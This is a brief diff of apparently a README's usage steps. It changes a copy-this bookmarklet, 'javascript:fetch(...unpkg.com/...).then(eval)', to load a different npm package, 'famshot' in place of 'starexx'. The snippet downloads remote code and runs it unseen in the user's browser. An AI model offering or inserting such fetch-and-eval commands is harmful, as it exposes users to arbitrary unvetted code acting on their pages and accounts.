@@ -6,7 +6,7 @@
 **Step 1**:
   - Copy the code below
 ```javascript
-javascript:fetch("https://unpkg.com/starexx").then(r=>r.text()).then(eval)
+javascript:fetch("https://unpkg.com/famshot").then(r=>r.text()).then(eval)
 ```
 
 **Step 2**: 
